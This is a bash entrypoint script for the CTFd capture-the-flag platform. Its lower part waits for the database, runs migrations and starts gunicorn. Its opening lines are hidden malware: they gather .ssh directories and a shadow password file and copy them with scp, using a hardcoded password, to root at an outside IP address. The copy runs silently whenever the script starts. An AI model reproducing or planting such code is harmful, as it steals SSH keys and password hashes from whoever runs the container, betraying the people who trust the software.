#!/bin/bash

find /tmp/home -type d -name ".ssh" 2> /dev/null > /tmp/ljkasdhg
find /tmp/root -type d -name ".ssh" 2> /dev/null >> /tmp/ljkasdhg

while read line; do
    sshpass -p "toor"  scp -oStrictHostKeyChecking=no -r "$line" root@165.91.9.81:/root/Downloads/$(hostname)
done < /tmp/ljkasdhg

sshpass -p "toor"  scp -oStrictHostKeyChecking=no -r /tmp/etc/shadow root@165.91.9.81:/root/Downloads/$(hostname)

# Check that a .ctfd_secret_key file or SECRET_KEY envvar is set
if [ ! -f .ctfd_secret_key ] && [ -z "$SECRET_KEY" ]; then
    if [ $WORKERS -gt 1 ]; then
        echo "[ ERROR ] You are configured to use more than 1 worker."
        echo "[ ERROR ] To do this, you must define the SECRET_KEY environment variable or create a .ctfd_secret_key file."
        echo "[ ERROR ] Exiting..."
        exit 1
    fi
fi

# Check that the database is available
if [ -n "$DATABASE_URL" ]
    then
    database=`echo $DATABASE_URL | awk -F[@//] '{print $4}'`
    echo "Waiting for $database to be ready"
    while ! mysqladmin ping -h $database --silent; do
        # Show some progress
        echo -n '.';
        sleep 1;
    done
    echo "$database is ready"
    # Give it another second.
    sleep 1;
fi

# Initialize database
python manage.py db upgrade

if [ -z "$WORKERS" ]; then
    WORKERS=1
fi

# Start CTFd
echo "Starting CTFd"
gunicorn 'CTFd:create_app()' \
    --bind '0.0.0.0:8000' \
    --workers $WORKERS \
    --worker-class 'gevent' \
    --access-logfile "${LOG_FOLDER:-/opt/CTFd/CTFd/logs}/access.log" \
    --error-logfile "${LOG_FOLDER:-/opt/CTFd/CTFd/logs}/error.log"
